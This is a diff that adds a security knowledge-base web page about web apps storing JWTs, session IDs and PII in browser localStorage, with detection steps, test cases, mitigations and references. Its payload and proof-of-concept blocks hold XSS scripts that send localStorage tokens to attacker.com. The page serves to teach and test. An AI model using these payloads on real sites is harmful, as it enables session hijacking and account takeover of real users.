@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sensitive Data in LocalStorage | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* same base styles as previous files – copy from the style block in weak-password-policy.html */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 153, 0, 0.2); color: #ff9900; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 153, 0, 0.1); border-left: 4px solid #ff9900; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+    @media (max-width: 768px) { .container { padding: 0 1rem; } .mobile-menu { display: block; } .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; } .nav-links.show { display: flex; } .page-header h1 { font-size: 1.8rem; } }
+  </style>
+</head>
+<body>
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../status.html">Status</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Sensitive Data in LocalStorage</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Medium to High Severity | OWASP A04:2021</span>
+      <h1>📌 Sensitive Data in Browser Local Storage</h1>
+    </div>
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is the vulnerability?</strong></p>
+      <p>Applications store JWT tokens, session IDs, API keys, or personally identifiable information (PII) in `localStorage`. Any XSS vulnerability on the same domain can read this data and exfiltrate it to an attacker, leading to account takeover.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <p>Developers use `localStorage` for convenience because it is synchronous and persists across browser sessions. They overlook that it is accessible to any JavaScript running on the page.</p>
+      <p><strong>Security principle violated:</strong> Insecure Storage / Least Privilege</p>
+      <p><strong>Real-world analogy:</strong> Storing your house keys under the doormat – anyone who finds them can enter.</p>
+    </div>
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Insecure Storage</li>
+        <li><strong>OWASP:</strong> A04:2021 – Insecure Design</li>
+        <li><strong>CWE:</strong> CWE-922: Insecure Storage of Sensitive Information</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ Single-page applications (SPAs) storing tokens in `localStorage`</li>
+        <li>✅ Any site using `localStorage` for authentication state</li>
+        <li>✅ Applications that store user profile data, API keys, or payment info in `localStorage`</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <h3>1. Static Analysis</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Vulnerable code
+localStorage.setItem('token', jwtToken);
+localStorage.setItem('user', JSON.stringify(user));</pre>
+      </div>
+      <h3>2. Dynamic Analysis</h3>
+      <ul>
+        <li>Open Developer Tools (F12) → Application → Local Storage.</li>
+        <li>Check for tokens, user data, or secrets.</li>
+        <li>Look for keys named `token`, `access_token`, `jwt`, `user`, `api_key`, `password`.</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>💣 Basic Payloads (XSS to steal localStorage)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;script&gt;
+  var data = localStorage.getItem('token');
+  fetch('https://attacker.com/steal?token=' + btoa(data));
+&lt;/script&gt;</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>🚀 Advanced Payloads</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Steal entire localStorage
+&lt;script&gt;
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(localStorage)
+  });
+&lt;/script&gt;</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Login and inspect localStorage</td><td style="padding: 0.75rem;">No sensitive data</td><td style="padding: 0.75rem;">JWT token found</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Inject XSS payload to read localStorage</td><td style="padding: 0.75rem;">Token not accessible</td><td style="padding: 0.75rem;">Token exfiltrated</td></tr>
+        </tbody>
+      </table>
+      <p>✔ Must be reproducible</p>
+    </div>
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Find an XSS vulnerability on the same domain.</li>
+        <li>Craft a payload to read `localStorage` and send data to attacker server.</li>
+        <li>Wait for a victim to trigger the XSS.</li>
+        <li>Use stolen token to impersonate the victim.</li>
+      </ol>
+    </div>
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Use HTTP‑only cookies instead of localStorage for session tokens.</strong><br>
+        <strong>✅ Never store sensitive data (tokens, PII) in localStorage.</strong><br>
+        <strong>✅ Implement Content Security Policy (CSP) to prevent XSS.</strong><br>
+        <strong>✅ Short token lifetimes and use refresh tokens.</strong><br>
+        <strong>✅ Encrypt data before storing in localStorage (but prefer not storing at all).</strong>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>🔓 Mitigation Bypass</h2>
+      <ul>
+        <li>If CSP is weak or misconfigured, XSS may still be possible.</li>
+        <li>If tokens are short-lived, but the attacker can continuously refresh them, they can maintain access.</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Medium to High</strong><br><br>
+        <strong>Impact:</strong> Session hijacking, account takeover, data theft.
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;script&gt;
+  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));
+&lt;/script&gt;</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/controls/Secure_Storage" style="color: var(--primary);">OWASP – Secure Storage</a></li>
+        <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" style="color: var(--primary);">MDN – localStorage</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | LocalStorage Security Guide</p></footer>
+<script>/* same scripts */</script>
+</body>
+</html>
